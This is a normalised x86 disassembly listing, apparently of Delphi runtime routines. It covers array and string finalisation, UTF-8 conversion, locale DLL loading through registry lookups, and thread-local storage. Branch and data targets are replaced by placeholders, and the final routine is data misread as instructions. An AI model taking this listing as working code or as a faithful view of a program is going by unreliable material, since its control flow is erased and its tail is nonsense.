cmp cl 0xa
je r-xdata
mov edx eax
add eax esi
add edx ebx
call sub_4028b8
mov edx [ eax + esi ]
add eax ebx
call sub_404034
mov eax 0x4
jmp r-xdata
cmp cl 0xb
je r-xdata
add eax [ edi + 0x4 ]
add edi 0x8
dec ebp
jne r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_4046fc
mov eax 0x4
jmp r-xdata
cmp cl 0xc
je r-xdata
mov ecx [ edi + 0x4 ]
sub ecx eax
jle r-xdata
pop ecx
sub ecx eax
jle r-xdata
lea edx [ eax + esi ]
add eax ebx
call sub_404b60
mov eax 0x10
jmp r-xdata
cmp cl 0xd
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
lea edx [ eax + ebx ]
add eax esi
call sub_4028b8
xor ecx ecx
mov cl [ edx + 0x1 ]
push [ ecx + edx + 0x2 ]
push [ ecx + edx + 0x6 ]
mov ecx [ ecx + edx + 0xa ]
mov ecx [ ecx ]
lea edx [ eax + esi ]
add eax ebx
call sub_404c94
pop eax
jmp r-xdata
cmp cl 0xe
je r-xdata
xor ecx ecx
mov cl [ edx + 0x1 ]
mov ecx [ ecx + edx + 0x2 ]
push ecx
mov ecx edx
lea edx [ eax + esi ]
add eax ebx
call sub_404b78
pop eax
jmp r-xdata
cmp cl 0xf
je r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_405664
mov eax 0x4
jmp r-xdata
cmp cl 0x11
je r-xdata
mov ecx edx
mov edx [ eax + esi ]
add eax ebx
call sub_404fdc
mov eax 0x4
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402818
sub_404c94
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov ebp [ esp + 0x14 ]
mov cl [ edi ]
cmp cl 0xa
je r-xdata
mov eax ebx
mov edx [ esi ]
call sub_404034
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xb
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_4046fc
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xc
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn 0x4
jmp r-xdata
mov eax ebx
mov edx esi
call sub_404b60
add ebx 0x10
add esi 0x10
dec ebp
jne r-xdata
cmp cl 0xd
je r-xdata
jmp r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
lea edi [ ecx + edi + 0x2 ]
cmp cl 0xe
je r-xdata
mov eax ebx
mov edx esi
mov ecx [ edi + 0x8 ]
push [ edi + 0x4 ]
call sub_404c94
add ebx [ edi ]
add esi [ edi ]
dec ebp
jne r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
mov ecx edi
call sub_404b78
xor eax eax
mov al [ edi + 0x1 ]
add ebx [ eax + edi + 0x2 ]
add esi [ eax + edi + 0x2 ]
dec ebp
jne r-xdata
cmp cl 0xf
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_405664
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
mov ecx edi
call sub_404fdc
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402818
sub_404db4
push edx
push eax
mov eax [ esp + 0x10 ]
mul [ esp ]
mov ecx eax
mov eax [ esp + 0x4 ]
mul [ esp + 0xc ]
add ecx eax
mov eax [ esp ]
mul [ esp + 0xc ]
add edx ecx
pop ecx
pop ecx
retn 0x8
sub_404e08
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
mov eax [ ebp + 0x8 ]
mov edi [ eax ]
test edi edi
jg r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
test ebx ebx
je r-xdata
test edi edi
jge r-xdata
xor eax eax
mov al [ esi + 0x1 ]
add esi eax
mov eax esi
mov edx [ eax + 0x2 ]
mov [ ebp - 0x18 ] edx
mov edx [ eax + 0x6 ]
test edx edx
je r-xdata
sub ebx 0x4
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
sub ebx 0x4
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_404e00
jmp r-xdata
mov al 0x4
call sub_402818
xor esi esi
mov esi [ edx ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebp - 0x1c ] 0x8
test ebx ebx
je r-xdata
mov al 0x4
call sub_402818
mov eax edi
imul [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
cdq
idiv edi
cmp eax [ ebp - 0x18 ]
je r-xdata
mov [ ebp - 0x20 ] ebx
cmp edi [ ebp - 0x10 ]
jge r-xdata
cmp [ ebx ] 0x1
jne r-xdata
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
call sub_4026fc
mov ebx [ ebp - 0x20 ]
jmp r-xdata
test esi esi
je r-xdata
dec [ ebx ]
mov eax [ ebp - 0x1c ]
call sub_4026bc
mov ebx eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp edi [ ebp - 0x14 ]
jge r-xdata
mov [ ebx ] 0x1
add ebx 0x4
mov [ ebx ] edi
add ebx 0x4
mov edx edi
sub edx [ ebp - 0x10 ]
imul edx [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
imul eax [ ebp - 0x10 ]
add eax ebx
xor ecx ecx
call sub_402cac
cmp [ ebp - 0x8 ] 0x1
jle r-xdata
mov eax ebx
add eax 0x8
mov edx edi
imul edx [ ebp - 0x18 ]
add eax edx
mov ecx [ ebp - 0x10 ]
sub ecx edi
mov edx esi
call j_sub_404a68
test esi esi
je r-xdata
mov [ ebp - 0x14 ] edi
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
add [ ebp + 0x8 ] 0x4
dec [ ebp - 0x8 ]
dec edi
test edi edi
jl r-xdata
mov ecx [ ebp - 0x14 ]
imul ecx [ ebp - 0x18 ]
mov edx ebx
add edx 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4028b8
mov edx [ ebp - 0x14 ]
imul edx [ ebp - 0x18 ]
mov eax ebx
add eax 0x8
xor ecx ecx
call sub_402cac
mov eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov eax ebx
add eax 0x8
mov ecx esi
call sub_404de8
jmp r-xdata
inc edi
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0xc ]
lea eax [ ebx + eax * 4 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
call sub_404e08
inc [ ebp - 0xc ]
dec edi
jne r-xdata
sub_404fa0
mov ecx [ eax ]
test ecx ecx
je r-xdata
retn
mov [ eax ] 0x0
[ ecx - 0x8 ]
jne r-xdata
push eax
mov eax ecx
xor ecx ecx
mov cl [ edx + 0x1 ]
mov edx [ ecx + edx + 0x6 ]
test edx edx
je r-xdata
sub eax 0x8
call sub_4026dc
pop eax
mov ecx [ eax - 0x4 ]
test ecx ecx
je r-xdata
mov edx [ edx ]
call sub_404a68
sub_404fdc
push ebx
mov ebx [ eax ]
test edx edx
je r-xdata
test ebx ebx
je r-xdata
[ edx - 0x8 ]
mov [ eax ] edx
pop ebx
retn
[ ebx - 0x8 ]
jne r-xdata
push eax
push edx
mov edx ecx
inc [ ebx - 0x8 ]
call sub_404fa0
pop edx
pop eax
sub_405004
add esp 0xffffffe4
push 0x1c
lea edx [ esp + 0x4 ]
push edx
push eax
call sub_4012cc
cmp [ esp + 0x10 ] 0x1000
jne r-xdata
xor eax eax
mov eax [ esp + 0x4 ]
jmp r-xdata
add esp 0x1c
retn
sub_405034
push ebx
push esi
add esp 0xfffffef8
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
add esp 0x108
pop esi
pop ebx
retn
push 0x105
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call sub_40125c
mov eax esp
mov dl 0x1
call sub_405270
mov esi eax
mov [ ebx + 0x10 ] esi
test esi esi
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ ebx + 0x10 ] eax
sub_40507c
mov edx [ rw-data ]
test edx edx
je r-xdata
retn
cmp eax [ edx + 0x4 ]
je r-xdata
mov eax edx
call sub_405034
retn
cmp eax [ edx + 0x8 ]
je r-xdata
cmp eax [ edx + 0xc ]
jne r-xdata
mov edx [ edx ]
test edx edx
jne r-xdata
sub_4050b8
push ebp
mov ebp esp
add esp 0xfffffdb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
push r-xdata
call sub_401264
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x5c
jne r-xdata
push r-xdata
push esi
call sub_40126c
mov ebx eax
test ebx ebx
je r-xdata
mov esi [ ebp - 0x4 ]
add esi 0x2
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x5c
jne r-xdata
push 0x105
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call ebx
test eax eax
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
add eax 0x2
call sub_4050a4
mov esi eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
jmp r-xdata
lea eax [ esi + 0x1 ]
call sub_4050a4
mov edi eax
mov eax edi
sub eax esi
mov edx eax
add edx ebx
inc edx
cmp edx 0x105
jg r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
lea eax [ esi + 0x1 ]
call sub_4050a4
mov esi eax
cmp [ esi ] 0x0
je r-xdata
inc eax
push eax
push esi
lea eax [ ebp - 0x24f ]
add eax ebx
push eax
call lstrcpynA
lea eax [ ebp - 0x14a ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call FindFirstFileA
mov esi eax
cmp esi 0xffffffff
je r-xdata
jmp r-xdata
push esi
call FindClose
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
lea edx [ ebx + 0x1 ]
add eax edx
inc eax
cmp eax 0x105
jg r-xdata
mov ebx esi
sub ebx [ ebp - 0x4 ]
lea eax [ ebx + 0x1 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call lstrcpynA
jmp r-xdata
mov [ ebp + ebx - 0x24f ] 0x5c
mov eax 0x105
sub eax ebx
dec eax
push eax
lea eax [ ebp - 0x11e ]
push eax
lea eax [ ebp - 0x24f ]
add eax ebx
inc eax
push eax
call lstrcpynA
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
inc eax
add ebx eax
mov esi edi
sub_405270
push ebp
mov ebp esp
add esp 0xfffffee0
push ebx
push esi
mov [ ebp - 0x4 ] eax
push 0x105
lea eax [ ebp - 0x11d ]
push eax
push 0x0
call sub_40125c
mov [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_4012b4
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_405375
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x18 ] 0x5
lea eax [ ebp - 0x11d ]
mov edx 0x105
call sub_4050b8
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x11d ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call sub_4012bc
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000002
call sub_4012b4
test eax eax
je r-xdata
mov [ ebp - 0xe ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_4012ac
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_4012bc
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_4012b4
test eax eax
jne r-xdata
mov [ ebp - 0x12 ] 0x0
push 0x105
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x11d ]
push eax
call lstrcpynA
push 0x5
lea eax [ ebp - 0xd ]
push eax
push 0x3
call sub_40127c
push eax
call sub_401254
xor esi esi
cmp [ ebp - 0x11d ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0xd ] 0x0
jne r-xdata
lea eax [ ebp - 0x11d ]
push eax
call lstrlenA
mov ebx eax
lea eax [ ebp - 0x11d ]
add ebx eax
jmp r-xdata
cmp [ ebp - 0x12 ] 0x0
je r-xdata
cmp [ ebx ] 0x2e
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
jne r-xdata
inc ebx
cmp [ ebp - 0x12 ] 0x0
je r-xdata
dec ebx
test esi esi
jne r-xdata
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0x12 ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
cmp [ ebp - 0xd ] 0x0
je r-xdata
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
test esi esi
jne r-xdata
mov [ ebp - 0xb ] 0x0
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
sub_405510
push ebx
push esi
mov esi [ rw-data ]
test esi esi
je r-xdata
mov edx esi
test edx edx
je r-xdata
mov edx [ esi + 0x4 ]
cmp edx eax
jne r-xdata
pop esi
pop ebx
retn
mov ecx [ edx ]
test ecx ecx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ rw-data ] eax
mov edx 0x8
mov eax esi
call sub_4026dc
pop esi
pop ebx
retn
mov edx [ edx ]
test edx edx
jne r-xdata
mov ebx [ ecx + 0x4 ]
cmp ebx eax
jne r-xdata
mov esi ecx
mov eax [ ecx ]
mov [ edx ] eax
mov edx 0x8
mov eax esi
call sub_4026dc
jmp r-xdata
sub_405570
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_4055ab
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
sub_4055dc
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_405640
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_405570
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405647
mov eax [ ebp - 0x4 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ rw-data ] eax
jmp r-xdata
retn
mov edx [ eax ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
mov eax [ eax ]
test eax eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ eax ] edx
jmp r-xdata
sub_405664
test edx edx
je r-xdata
mov ecx [ eax ]
test ecx ecx
mov [ eax ] edx
je r-xdata
push edx
push eax
mov eax [ edx ]
push edx
call [ eax + 0x4 ]
pop eax
mov ecx [ eax ]
pop [ eax ]
test ecx ecx
jne r-xdata
retn
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
retn
retn
sub_405690
test edx edx
je sub_40564c
push edi
mov edi eax
push 0x0
push esp
push ecx
push edx
mov eax [ edx ]
call [ eax ]
test eax eax
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
mov al 0x17
jmp sub_402818
pop eax
mov [ edi ] eax
pop edi
retn
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
sub_405734
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x4 ]
push eax
call InterlockedDecrement
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x4 ]
sub_40575c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
xor edx edx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax edx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
xor esi esi
xor ecx ecx
test eax eax
je r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
lea edx [ esi + 0x1 ]
mov eax [ ebp - 0x8 ]
movzx edx [ eax + ecx * 2 ]
inc ecx
cmp edx 0x7f
jbe r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
inc esi
cmp ecx [ ebp + 0x8 ]
jb r-xdata
cmp edx 0x7ff
jbe r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
inc esi
inc esi
mov [ eax + esi ] 0x0
jmp r-xdata
mov esi [ ebp - 0x4 ]
dec esi
mov edx [ ebp - 0x8 ]
movzx edx [ edx + ecx * 2 ]
inc ecx
cmp edx 0x7f
ja r-xdata
cmp edx 0x7ff
jbe r-xdata
mov [ eax + esi ] dl
inc esi
jmp r-xdata
lea ebx [ esi + 0x2 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
lea ebx [ esi + 0x3 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
mov ebx edx
shr ebx 0x6
or bl 0xc0
mov [ eax + esi ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x1 ] dl
add esi 0x2
mov ebx edx
shr ebx 0xc
or bl 0xe0
mov [ eax + esi ] bl
mov ebx edx
shr ebx 0x6
and bl 0x3f
or bl 0x80
mov [ eax + esi + 0x1 ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x2 ] dl
add esi 0x3
jmp r-xdata
sub_405838
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0xffffffff
xor eax eax
xor esi esi
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
inc eax
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
test dl 0x80
je r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
cmp esi [ ebp + 0x8 ]
jb r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
and dl 0x3f
test dl 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
dec eax
mov edx [ ebp - 0xc ]
xor ecx ecx
mov cl [ edx + esi ]
inc esi
test cl 0x80
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] cx
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
and ecx 0x3f
test cl 0x20
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
and dl 0x3f
and edx 0xff
shl ecx 0x6
or dx cx
mov ecx [ ebp - 0x4 ]
mov [ ecx + eax * 2 ] dx
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
and dl 0x3f
and edx 0xff
shl ecx 0x6
or edx ecx
mov ecx edx
sub_405970
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405a0f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403fe0
mov eax ebx
xor edx edx
call sub_404838
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405a16
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
mov eax ebx
call sub_40482c
lea edx [ eax + eax * 2 ]
lea eax [ ebp - 0x4 ]
call sub_40462c
mov eax ebx
call sub_40482c
push eax
mov eax [ ebp - 0x4 ]
call sub_4042a0
inc eax
push eax
mov eax ebx
call sub_40481c
push eax
mov eax [ ebp - 0x4 ]
call sub_4044a0
pop ecx
pop edx
call sub_40575c
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_403fe0
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_40462c
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404034
sub_405a1c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405ab3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4046c0
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405aba
lea eax [ ebp - 0x4 ]
call sub_4046c0
retn
mov eax ebx
call sub_4042a0
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_404908
mov eax ebx
call sub_4042a0
push eax
mov eax [ ebp - 0x4 ]
call sub_40482c
inc eax
push eax
mov eax ebx
call sub_4044a0
push eax
mov eax [ ebp - 0x4 ]
call sub_40481c
pop ecx
pop edx
call sub_405838
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_4046c0
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_404908
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4046fc
sub_405ac0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405b03
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_40480c
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_405970
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405b0a
lea eax [ ebp - 0x4 ]
call sub_4046c0
retn
sub_405b10
push ebx
push esi
add esp 0xfffffc00
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
add esp 0x400
pop esi
pop ebx
retn
cmp [ ebx + 0x4 ] 0x10000
jge r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_4041d8
push 0x400
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_40507c
push eax
call sub_40128c
mov ecx eax
mov edx esp
mov eax esi
call sub_4040d0
jmp r-xdata
sub_405b68
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
xor edx edx
push ebp
push sub_405bce
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0xb ]
push edx
push 0x1004
push eax
call sub_401254
lea eax [ ebp - 0x10 ]
lea edx [ ebp - 0xb ]
mov ecx 0x7
call sub_404250
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x4 ]
call sub_402ccc
mov ebx eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405bd5
lea eax [ ebp - 0x10 ]
call sub_403fe0
retn
xor ebx ebx
sub_405bdc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405c26
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405c2d
retn
mov eax rw-data
call sub_402b08
mov eax rw-data
call sub_402b08
mov eax rw-data
call sub_402b08
call sub_401ac0
sub_405c30
sub [ rw-data ] 0x1
jae r-xdata
retn
mov [ rw-data ] 0x2
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] 0x2
mov [ rw-data ] sub_404dac
call sub_4030d8
test al al
je r-xdata
call sub_4031cc
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
call GetCommandLineA
mov [ rw-data ] eax
call sub_40130c
mov [ rw-data ] eax
call sub_401304
and eax 0x80000000
cmp eax 0x80000000
je r-xdata
call sub_403108
call sub_40127c
call sub_405b68
mov [ rw-data ] eax
call sub_401304
and eax 0xff
cmp ax 0x4
jbe r-xdata
call sub_40127c
call sub_405b68
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] 0x3
jmp r-xdata
call sub_4012fc
mov [ rw-data ] eax
sub_405d38
push ebx
call sub_405d30
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov eax ebx
call sub_405d24
test eax eax
jne r-xdata
mov eax 0xe2
call sub_403fd4
push eax
mov eax [ rw-data ]
push eax
call TlsSetValue
mov eax 0xe2
call sub_403fd4
sub_405d7c
mov cl [ rw-data ]
mov eax [ rw-data ]
test cl cl
jne r-xdata
push eax
call TlsGetValue
test eax eax
je r-xdata
mov edx [ fs : 0x2c ]
mov eax [ edx + eax * 4 ]
retn
call sub_405d38
mov eax [ rw-data ]
push eax
call TlsGetValue
test eax eax
je r-xdata
retn
mov eax [ rw-data ]
retn
retn
sub_405dc8
push ebx
mov ebx eax
xor eax eax
mov [ rw-data ] eax
push 0x0
call sub_405d04
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
call sub_405dbc
mov edx rw-data
mov eax ebx
call sub_403d28
pop ebx
retn
sub_405e0c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405e31
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405e38
retn
sub_405e68
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
add ecx eax
mov [ ebx + 0x8 ] ecx
add edx [ ebp + 0xc ]
mov [ ebx + 0xc ] edx
pop ebx
pop ebp
retn 0x8
sub_405e84
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405ea9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405eb0
retn
sub_405ebc
rcr [ esi + 0x40 ] 0x0
add eax [ edx ]
xor [ cs : 0x0 ] eax
or al 0x0
add [ eax ] al
mov esp 0xa00405e
outsd
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
or [ edi + 0x64 ] ch
inc edi
jb r-xdata
jb r-xdata
jns r-xdata
push ebx
inc edi
xor [ fs : ebx ] ecx
outsd
push edx
jae r-xdata
or ch [ fs : edi + 0x64 ]
inc esp
imul esi [ ebx + 0x61 ] 0x64656c62
or [ edi + 0x64 ] ebp
inc ebx
